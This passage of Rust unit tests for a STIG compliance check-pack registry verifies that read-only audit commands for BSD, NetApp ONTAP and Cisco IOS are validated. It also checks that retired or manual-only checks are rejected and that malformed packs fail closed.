            assert!(validate_read_only_command(CheckPlatform::Bsd, command).is_ok());
        }
        for retired in [
            "ntpq -pn",
            "cat /var/db/zoneinfo",
            "sysctl kern.elf64.aslr.enable",
        ] {
            assert!(validate_read_only_command(CheckPlatform::Bsd, retired).is_err());
        }
        assert!(validate_read_only_command(
            CheckPlatform::Ontap,
            "security login role config show -role admin -fields passwd-minlength"
        )
        .is_ok());
    }

    #[test]
    fn ontap_unprovable_requirements_are_not_executable() {
        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        let pack = registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R4")
            .into_iter()
            .next()
            .unwrap();
        for vuln_id in [
            "V-246925", "V-246931", "V-246932", "V-246938", "V-246940", "V-246944", "V-246948",
        ] {
            assert!(
                pack.checks.iter().all(|check| check.vuln_id != vuln_id),
                "{vuln_id} must remain manual until sufficient evidence exists"
            );
        }
        for command in [
            "cluster date show",
            "security login show -authentication-method domain",
            "security login banner show",
            "security login role config show -role admin -instance",
            "system configuration backup show",
        ] {
            assert!(
                validate_read_only_command(CheckPlatform::Ontap, command).is_err(),
                "manual-only command remained executable: {command}"
            );
        }
    }

    #[test]
    fn invalid_check_pack_is_not_silently_skipped() {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::write(dir.path().join("bad.json"), b"not json").unwrap();
        let mut registry = CheckPackRegistry::new();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 20)
            .is_err());
    }

    #[test]
    fn semantic_pack_errors_are_rejected() {
        let mut pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-1".to_string(),
                platform: CheckPlatform::Ontap,
                check: Check::Command {
                    command: "service auditd onestatus".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: r"(?i)\bauditd\s+is\s+running\b".to_string(),
                },
                description: None,
                implementation_class: ImplementationClass::LegacyDeclarative,
                introduction_release: Some("0.3".to_string()),
            }],
        };
        assert!(validate_pack(&pack).is_err());

        pack.checks[0].platform = CheckPlatform::Bsd;
        pack.checks.push(pack.checks[0].clone());
        assert!(validate_pack(&pack).is_err());
    }

    #[test]
    fn executable_pack_boundary_rejects_scope_release_and_trivial_predicates() {
        let definition = CheckDefinition {
            vuln_id: "V-TEST".to_string(),
            platform: CheckPlatform::Bsd,
            check: Check::Command {
                command: "service auditd onestatus".to_string(),
                pattern: None,
                is_regex: false,
            },
            expected: ExpectedResult::Matches {
                pattern: r"(?i)\bauditd\s+is\s+running\b".to_string(),
            },
            description: None,
            implementation_class: ImplementationClass::LegacyDeclarative,
            introduction_release: Some("0.3".to_string()),
        };
        let mut pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: -100,
            checks: vec![definition],
        };
        assert!(validate_pack(&pack).is_ok());

        pack.checks[0].implementation_class = ImplementationClass::Unknown;
        pack.checks[0].introduction_release = None;
        assert!(validate_pack(&pack).is_ok());
        pack.checks[0].implementation_class = ImplementationClass::ReviewedImperative;
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].implementation_class = ImplementationClass::LegacyDeclarative;
        pack.checks[0].introduction_release = None;
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].introduction_release = Some("v0.3".to_string());
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].introduction_release = Some("0.3".to_string());
        assert!(validate_pack(&pack).is_ok());

        pack.stig_id = "Unsupported_STIG".to_string();
        assert!(validate_pack(&pack).is_err());
        pack.stig_id = "General_Purpose_Operating_System".to_string();
        pack.version = "V3R2".to_string();
        assert!(validate_pack(&pack).is_err());
        pack.version = "V3R3".to_string();

        pack.checks[0].expected = ExpectedResult::Matches {
            pattern: "[".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::Matches {
            pattern: ".*".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::MatchCountAtLeast {
            pattern: "x".to_string(),
            min: 0,
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::NotContains {
            substring: " ".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::IsTrue;
        if let Check::Command { pattern, .. } = &mut pack.checks[0].check {
            *pattern = Some(String::new());
        }
        assert!(validate_pack(&pack).is_err());

        let cisco = CheckPack {
            stig_id: "Cisco_IOS-XE_Router_NDM_STIG".to_string(),
            platform: CheckPlatform::CiscoIos,
            version: "V3R7".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-TEST".to_string(),
                platform: CheckPlatform::CiscoIos,
                check: Check::ConfigLine {
                    pattern: " ".to_string(),
                    context: None,
                    should_exist: false,
                },
                expected: ExpectedResult::IsTrue,
                description: None,
                implementation_class: ImplementationClass::LegacyDeclarative,
                introduction_release: Some("0.3".to_string()),
            }],
        };
        assert!(validate_pack(&cisco).is_err());
    }

    #[test]
    fn typed_cisco_checks_are_top_level_and_vulnerability_bound() {
        let definition = CheckDefinition {
            vuln_id: "V-215807".to_string(),
            platform: CheckPlatform::CiscoIos,
            check: Check::CiscoVtySessionLimit,
            expected: ExpectedResult::Matches {
                pattern: "^compliant:".to_string(),
            },
            description: None,
            implementation_class: ImplementationClass::ReviewedImperative,
            introduction_release: Some("0.3".to_string()),
        };
        let mut pack = CheckPack {
            stig_id: "Cisco_IOS-XE_Router_NDM_STIG".to_string(),
            platform: CheckPlatform::CiscoIos,
            version: "V3R7".to_string(),
            priority: 100,
            checks: vec![definition],
        };
        assert!(validate_pack(&pack).is_ok());

        pack.checks[0].vuln_id = "V-215836".to_string();
        assert!(validate_pack(&pack).is_err());

        pack.checks[0].vuln_id = "V-215807".to_string();
        pack.checks[0].check = Check::All {
            checks: vec![Check::CiscoVtySessionLimit],
        };
        assert!(validate_pack(&pack).is_err());
    }

    #[test]
    fn predicate_pack_boundary_binds_schema_class_and_boolean_expectation() {
        let definition = CheckDefinition {
            vuln_id: "V-PREDICATE".to_string(),
            platform: CheckPlatform::Bsd,
            check: Check::Predicate {
                program: crate::checks::predicate::PredicateProgram {
                    schema_version: 1,
                    source: crate::checks::predicate::PredicateSource::Observation {
                        key: "service auditd onestatus".to_string(),
                    },
                    input: crate::checks::predicate::PredicateInput::Text,
                    predicate: crate::checks::predicate::Predicate::Present {
                        value: crate::checks::predicate::ValueRef {
                            scope: crate::checks::predicate::ValueScope::Root,
                            pointer: String::new(),
                        },
                    },
                },
            },
            expected: ExpectedResult::IsTrue,
            description: None,
            implementation_class: ImplementationClass::DeclarativePredicate,
            introduction_release: Some("0.4".to_string()),
        };
        let mut pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: 100,
            checks: vec![definition],
        };
        assert!(validate_pack(&pack).is_ok());

        pack.checks[0].implementation_class = ImplementationClass::LegacyDeclarative;
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].implementation_class = ImplementationClass::DeclarativePredicate;
        pack.checks[0].expected = ExpectedResult::NotContains {
            substring: "x".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::IsTrue;
        if let Check::Predicate { program } = &mut pack.checks[0].check {
            program.schema_version = 2;
        }
        assert!(validate_pack(&pack).is_err());
    }

    #[test]
    fn unknown_executable_pack_fields_are_rejected() {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::write(
            dir.path().join("unknown.json"),
            br#"{
              "stig_id":"General_Purpose_Operating_System",
              "platform":"bsd",
              "version":"V3R3",
              "priority":100,
              "checks":[],
              "allow_mutation":true
            }"#,
        )
        .unwrap();
        let mut registry = CheckPackRegistry::new();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 20)
            .is_err());
    }

    #[test]
    fn release_selection_fails_closed() {
        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        assert!(!registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R4")
            .is_empty());
        assert!(registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R3")
            .is_empty());
    }
}
